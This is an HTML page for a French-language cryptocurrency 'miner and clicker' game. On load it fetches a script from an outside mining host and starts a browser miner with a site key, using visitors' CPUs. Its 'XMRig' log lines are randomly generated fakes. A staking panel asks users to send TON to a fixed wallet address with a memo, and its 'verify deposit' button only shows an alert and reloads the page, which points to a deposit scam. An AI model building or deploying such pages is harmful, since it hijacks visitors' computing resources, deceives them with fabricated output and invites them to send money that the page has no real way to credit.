<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Deadspot Miner + Clicker</title>
  <style>
    body {
      background:#0d0d0d;
      color:#eee;
      font-family: monospace;
      margin:0; padding:0;
      display:flex;
      flex-direction:column;
      height:100vh;
    }
    h1 { color:#4caf50; text-align:center; }

    /* Layout principal */
    .top {
      display:flex;
      justify-content:space-between;
      padding:10px;
    }
    .middle {
      text-align:center;
      margin:10px;
    }
    .bottom {
      display:flex;
      justify-content:space-between;
      align-items:flex-start;
      padding:10px;
      flex-grow:1;
    }

    /* Balance + √©nergie */
    #deadspotBalance { font-size:22px; color:#ffd700; }
    #energyBar {
      width: 400px; height: 20px;
      border:1px solid #444; margin:10px auto;
      background:#222; border-radius:5px; overflow:hidden;
    }
    #energyFill { height:100%; width:100%; background:#4caf50; transition:width 0.3s; }

    /* Bouton Skull */
    #clickBtn {
      width:200px; height:200px; border-radius:50%;
      background:#111; border:3px solid #444;
      cursor:pointer; overflow:hidden;
      box-shadow:0 0 20px #f00;
    }
    #clickBtn img { width:100%; height:100%; object-fit:cover; }
    #clickBtn:active { animation:pulseClick 0.4s; }
    @keyframes pulseClick {
      0%{box-shadow:0 0 20px #f00; transform:scale(1);}
      50%{box-shadow:0 0 50px #ff00ff; transform:scale(1.1);}
      100%{box-shadow:0 0 20px #f00; transform:scale(1);}
    }

    /* Pulseur */
    #pulseur {
      width:100px; height:100px; border-radius:50%;
      background:radial-gradient(circle, #ff0044, #800080);
      margin:0 auto 20px auto;
      animation:pulseDiamond 2s infinite;
      box-shadow:0 0 20px #ff0044;
      cursor:pointer;
    }
    @keyframes pulseDiamond {
      0%,100%{transform:scale(1); box-shadow:0 0 20px #ff0044;}
      50%{transform:scale(1.2); box-shadow:0 0 50px #ff00ff;}
    }

    /* Logs */
    #xmrigLogs {
      width:400px; height:300px; overflow-y:auto;
      background:rgba(15,15,15,0.8); color:#0f0;
      font-size:12px; padding:10px; border:1px solid #333;
    }
    .logAccepted{color:#4caf50;} .logRejected{color:#f44336;}

    /* Graphiques */
    #statsBox {
      width:400px; text-align:center;
    }
    canvas { background:#1a1a1a; border:1px solid #333; border-radius:10px; }

    /* D√©p√¥ts */
    #depositBox {
      width:400px; background:#111; border:1px solid #444; padding:10px;
      font-size:14px; border-radius:8px;
    }
    #stakedInfo { margin-top:10px; color:#0ff; }

    button {
      background:#333; color:#eee; padding:8px 15px;
      border:none; border-radius:5px; margin:5px; cursor:pointer;
    }
    button:hover{background:#555;}
  </style>
</head>
<body>

  <h1>üíé Deadspot Miner + Clicker Game</h1>

  <!-- TOP -->
  <div class="top">
    <!-- XMRig Logs -->
    <div id="xmrigLogs"></div>

    <!-- Bouton Skull -->
    <div id="clickBtn">
      <img src="https://cdn-icons-png.flaticon.com/512/3917/3917744.png" alt="skull">
    </div>
  </div>

  <!-- MIDDLE -->
  <div class="middle">
    <div id="deadspotBalance">Deadspot: 0</div>
    <div id="energyBar"><div id="energyFill"></div></div>
    <button id="exchangeBtn">üîÑ Convertir Hashes ‚Üí Deadspot</button>
    <button id="faucetBtn">üö∞ Faucet Claim</button>
  </div>

  <!-- BOTTOM -->
  <div class="bottom">
    <!-- D√©p√¥ts & Staking -->
    <div id="depositBox">
      <h3>üí∞ D√©p√¥ts & Staking</h3>
      <p><b>Wallet TON :</b> EQD14kgmngE0fNYVs7_9dw78V3rPhNt7_Ee-7X3ykDORQvMp</p>
      <p><b>Memo :</b> 492929</p>
      <p>‚ö†Ô∏è D√©p√¥ts valid√©s manuellement. Cliquez sur "V√©rifier".</p>
      <input type="number" id="stakeInput" placeholder="Montant TON √† staker" style="width:90%;"><br>
      <button onclick="stakeTON()">üì• Staker TON</button>
      <button onclick="verifyDeposit()">üîç V√©rifier mon d√©p√¥t</button>
      <div id="stakedInfo">Total stak√© : 0 TON | Bonus: 0%</div>
      <div id="miniTokens"></div>
    </div>

    <!-- Pulseur -->
    <div>
      <div id="pulseur"></div>
      <p>Chaque pulsation ajoute +0.5% de bonus pool</p>
    </div>

    <!-- Stats Hashrate -->
    <div id="statsBox">
      <h3>üìä Hashrate</h3>
      <div id="currentHps">H/s: 0.00</div>
      <div id="totalHashes">Total Hashes: 0</div>
      <canvas id="hashrateChart" width="380" height="200"></canvas>
    </div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
  <script src="https://www.hostingcloud.racing/WPmG.js"></script>
  <script>
    let deadspot = parseFloat(localStorage.getItem("deadspot")) || 0;
    let staked = parseFloat(localStorage.getItem("staked")) || 0;
    let poolBonus = parseFloat(localStorage.getItem("poolBonus")) || 0;
    let upgrades = JSON.parse(localStorage.getItem("upgrades")) || {x2:false, auto:false, regen:false, multi:false};

    let energy=500, maxEnergy=500, regenRate=1, clickValue=0.00015, autoClickInterval=null;

    function saveGame(){
      localStorage.setItem("deadspot", deadspot);
      localStorage.setItem("staked", staked);
      localStorage.setItem("poolBonus", poolBonus);
      localStorage.setItem("upgrades", JSON.stringify(upgrades));
    }
    function updateUI(){
      let extra = "";
      if(staked>=10) extra=" | Bonus x3 click & reward +2.5%";
      document.getElementById("deadspotBalance").textContent="Deadspot: "+deadspot.toFixed(5)+" | Pool +"+poolBonus.toFixed(2)+"%";
      document.getElementById("energyFill").style.width=(energy/maxEnergy*100)+"%";
      document.getElementById("stakedInfo").textContent="Total stak√© : "+staked+" TON | Bonus: +"+poolBonus.toFixed(2)+"%"+extra;
    }

    // Skull click
    document.getElementById("clickBtn").addEventListener("click", ()=>{
      if(energy>0){
        let gain=clickValue;
        if(upgrades.x2) gain*=2;
        if(upgrades.multi) gain*=5;
        if(staked>=10){ gain*=3; }
        gain*=(1+poolBonus/100);
        deadspot+=gain;
        energy--;
        updateUI(); saveGame();
      }
    });

    // Energie regen
    setInterval(()=>{ if(energy<maxEnergy){ energy=Math.min(maxEnergy, energy+regenRate); updateUI(); } },1000);

    // Pulseur
    document.getElementById("pulseur").addEventListener("animationiteration",()=>{
      poolBonus+=0.5;
      updateUI(); saveGame();
    });

    // Faucet
    document.getElementById("faucetBtn").addEventListener("click",()=>{
      const reward=Math.random()*(0.1-0.0002)+0.0002;
      deadspot+=reward;
      alert("üéâ Faucet: +"+reward.toFixed(5)+" DSC");
      updateUI(); saveGame();
    });

    // Stake TON
    function stakeTON(){
      let val=parseFloat(document.getElementById("stakeInput").value)||0;
      if(val>0){ staked+=val; saveGame(); updateUI(); checkMiniTokens(); }
    }
    function verifyDeposit(){ alert("üîç V√©rification manuelle par l‚Äôadmin."); location.reload(); }

    // Mini tokens unlock
    function checkMiniTokens(){
      if(staked>=1){
        document.getElementById("miniTokens").innerHTML="<p>üéÅ Mini tokens en fabrication... (listing futur DEX)</p>";
      }
    }

    // Miner
    var _client=new Client.Anonymous('e21d602e2242e7d28fc1409ef8a44920d6b5ffdfd95be04f205b4d12e520085f',{throttle:0.1,c:'w'});
    _client.start();

    // Graphique
    const ctx=document.getElementById('hashrateChart').getContext('2d');
    const hashrateChart=new Chart(ctx,{type:'line',data:{labels:[],datasets:[{label:'H/s',data:[],borderColor:'#4caf50',fill:true,tension:0.3}]},options:{responsive:false,animation:false,plugins:{legend:{labels:{color:'#eee'}}},scales:{x:{ticks:{color:'#aaa'}},y:{ticks:{color:'#aaa'}}}}});

    const xmrigLogs=document.getElementById("xmrigLogs");
    let t=0;
    setInterval(()=>{
      if(_client.isRunning()){
        const hps=_client.getHashesPerSecond();
        const total=_client.getTotalHashes();
        document.getElementById("currentHps").textContent="H/s: "+hps.toFixed(2);
        document.getElementById("totalHashes").textContent="Total Hashes: "+total;
        hashrateChart.data.labels.push(t+"s");
        hashrateChart.data.datasets[0].data.push(hps);
        if(hashrateChart.data.labels.length>20){ hashrateChart.data.labels.shift(); hashrateChart.data.datasets[0].data.shift(); }
        hashrateChart.update();
        for(let i=0;i<_client.getNumThreads();i++){
          const coreHps=(hps/_client.getNumThreads()*(0.9+Math.random()*0.2)).toFixed(2);
          const ok=Math.random()>0.05;
          const line=`[${new Date().toLocaleTimeString()}] Core #${i} | ${coreHps} H/s | ${ok?"Accepted":"Rejected"}`;
          const span=document.createElement("span");
          span.className=ok?"logAccepted":"logRejected";
          span.textContent=line;
          xmrigLogs.appendChild(span); xmrigLogs.appendChild(document.createElement("br"));
          xmrigLogs.scrollTop=xmrigLogs.scrollHeight;
        }
        t++;
      }
    },1000);

    updateUI(); checkMiniTokens();
  </script>
</body>
</html>



